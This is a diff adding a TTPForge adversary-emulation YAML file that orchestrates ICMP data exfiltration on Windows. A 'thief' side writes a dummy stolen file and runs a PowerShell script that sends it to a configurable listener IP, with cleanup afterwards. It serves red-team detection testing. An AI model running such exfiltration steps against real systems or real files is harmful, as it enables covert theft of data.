@@ -1,0 +1,63 @@
+---
+api_version: 2.0
+uuid: dfc5b2cf-8cff-43f4-b790-5a5c1a51155a
+name: powershell-icmp-exfiltration
+authors:
+  - jaysong
+description: Use a PowerShell script to capture data exfiltrated over ICMP requests and save it to a file.
+args:
+  - name: listener_ip
+    default: CHANGEME
+  - name: target_file_path
+    default: "C:/Users/Public/Desktop/stealme.txt"
+  - name: system_type
+    description: "The system that TTPForge is executed on"
+    default: listener
+  - name: ttp_dir
+    description: "Directory with the TTP logic to execute"
+    default: "C:/Users/Public/.ttpforge/repos/security-ttpcode/ttps/exfiltration/windows/icmp-exfil"
+  - name: timeout
+    description: "Set timeout for the listener"
+    default: 60
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1048 Exfiltration Over Alternative Protocol
+  subtechniques:
+    - T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol
+requirements:
+  platforms:
+    - os: windows
+
+steps:
+  - name: input-validation
+    executor: cmd.exe
+    inline: |
+      IF "{{ .Args.system_type }}"=="listener" (
+        IF NOT EXIST "{{ .Args.ttp_dir }}\{{ .Args.system_type }}.ps1" (
+          echo Provided ttp_dir {{ .Args.ttp_dir }} does not exist or is not a directory.
+          exit /b
+        )
+      ) ELSE IF "{{ .Args.system_type }}"=="thief" (
+        echo Hello! I am a stolen file, courtesy of the TTPForge!! > "{{ .Args.target_file_path }}"
+      ) ELSE (
+        echo Invalid system_type {{ .Args.system_type }}. Must be 'listener' or 'thief'.
+        exit /b
+      )
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-Item "{{ .Args.target_file_path }}"
+
+  - name: execute-ttp
+    file: "{{ .Args.ttp_dir }}\\{{ .Args.system_type }}.ps1"
+    args:
+      - "-TargetFile"
+      - "{{ .Args.target_file_path }}"
+      - "-IP"
+      - "{{ .Args.listener_ip }}"
+      - {{ if ne .Args.system_type "thief" }}
+      - "-Timeout"
+      - "{{ .Args.timeout }}"
+      - {{ end }}
